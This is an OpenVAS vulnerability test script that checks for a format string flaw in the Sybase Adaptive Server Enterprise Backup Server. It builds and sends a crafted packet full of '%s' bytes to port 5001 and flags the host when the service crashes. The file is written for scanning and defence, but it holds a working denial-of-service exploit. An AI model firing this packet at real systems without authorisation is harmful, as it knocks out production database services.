###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sybase_adaptive_server_format_string_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Sybase Adaptive Server Enterprise Backup Server Format String Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802222");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-07-15 12:23:42 +0200 (Fri, 15 Jul 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Sybase Adaptive Server Enterprise Backup Server Format String Vulnerability");
  script_xref(name:"URL", value:"https://secunia.com/advisories/45068");
  script_xref(name:"URL", value:"http://aluigi.org/adv/sybase_3-adv.txt");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1025717");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(5000, 5001);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
arbitrary code in the context of the application. Failed exploit attempts will
cause a denial-of-service condition.");
  script_tag(name:"affected", value:"Sybase Adaptive Server Enterprise 15.5 and prior.");
  script_tag(name:"insight", value:"The flaw is due to a format string error within the Backup Server
component when creating a log message. This can be exploited to cause the
process to crash or corrupt memory via a specially crafted packet sent to
TCP port 5001.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Sybase Adaptive Server and is prone to format
string vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


## Default Backup Server Port
port = 5001;
if(!get_port_state(port)){
  exit(0);
}

## Default Adaptive Server Port
adPort = 5000;
if(!get_port_state(adPort)){
  exit(0);
}

## Open Adaptive Server socket
soc = open_sock_tcp(adPort);
if(!soc){
  exit(0);
}

## Dummy Login packet
login_pkt =  raw_string( 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
               "servername" + crap(data:raw_string(0x00), length:20), 0x0a,
               "myusername" + crap(data:raw_string(0x00), length:20), 0x0a,
               "mypassword" + crap(data:raw_string(0x00), length:20), 0x0a,

               crap(data:raw_string(0x00), length:30),
               0x01, 0x02, 0x00, 0x06, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00,
               0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x43, 0x5f,
               0x41, 0x53, 0x45, 0x5f, 0x50, 0x6c, 0x75, 0x67, 0x69, 0x6e,

               crap(data:raw_string(0x00), length:50), 0x0a,
               "mypassword" + crap(data:raw_string(0x00), length:243),
               0x0c, 0x05, 0x00, 0x00, 0x00, 0x6a, 0x43, 0x6f, 0x6e, 0x6e,
               0x65, 0x63, 0x74, 0x00, 0x00, 0x08, 0x00, 0x06, 0x00, 0x00,
               0x00, 0x0c, 0x10,

               crap(data:raw_string(0x00, 0x00), length:24), 0x02, 0x01, 0x00,
               0x63, crap(data:raw_string(0x00, 0x00), length:10), 0x1e, 0x00,
               0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
               0x00, 0x00, crap(data:raw_string(0x00, 0x00), length:30),
               0x1e, 0x01, 0x35, 0x31, 0x32, 0x00, 0x00, 0x00, 0x03, 0x00,
               0x00, 0x00, 0x00, 0xe2, 0x00, 0x18, 0x01, 0x0c, 0x07, 0xcd,
               0xff, 0x85, 0xee, 0xef, 0x65, 0x7f, 0xff, 0xff, 0xff, 0xd6,
               0x02, 0x08, 0x00, 0x06, 0x80, 0x06, 0x48,0x00, 0x00, 0x00
             );

send(socket:soc, data:login_pkt);
res = recv(socket:soc, length:1024);
close(soc);

## Std response -> TDS Protocol
## Status: Last Buffer in request or response = 01
if(!(res && ord(res[0]) == 04 && ord(res[1]) == 01)){
  exit(0);
}

## Open Backup Server Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

crash = raw_string(0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00) +
      "servername" + crap(data:raw_string(0x00), length:20) + raw_string(0x0a) +
      "myusername" + crap(data:raw_string(0x00), length:20) + raw_string(0x0a) +
      "mypassword" + crap(data:raw_string(0x00), length:20) + raw_string(0x0a) +
      crap(data:raw_string(0x00), length:30) +
      raw_string(0x01, 0x02, 0x00, 0x06, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x43, 0x5f,
                 0x41, 0x53, 0x45, 0x5f, 0x50, 0x6c, 0x75, 0x67, 0x69, 0x6e) +
      crap(data:raw_string(0x00), length:50) + raw_string(0x0a) +
      "mypassword" + crap(data:raw_string(0x00), length:243) +
      raw_string(0x0c, 0x05, 0x00, 0x00, 0x00, 0x6a, 0x43, 0x6f, 0x6e, 0x6e,
                 0x65, 0x63, 0x74, 0x00, 0x00, 0x08, 0x00, 0x06, 0x00, 0x00,
                 0x00, 0x0c, 0x10) +
      crap(data:raw_string(0x25, 0x73), length:24) +
      raw_string(0x02, 0x01, 0x00, 0x63) +
      crap(data:raw_string(0x25, 0x73), length:10) +
      raw_string(0x1e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00) +
      crap(data:raw_string(0x25, 0x73), length:30) +
      raw_string(0x1e, 0x01, 0x35, 0x31, 0x32, 0x00, 0x00, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x00, 0xe2, 0x00, 0x18, 0x01, 0x0c, 0x07, 0xcd,
                 0xff, 0x85, 0xee, 0xef, 0x65, 0x7f, 0xff, 0xff, 0xff, 0xd6,
                 0x02, 0x08, 0x00, 0x06, 0x80, 0x06, 0x48,0x00, 0x00, 0x00);

## Sending Exploit
send(socket:soc, data:crash);
close(soc);

sleep(5);

soc = open_sock_tcp(port);
if(!soc)
{
  security_message(port);
  exit(0);
}
close(soc);
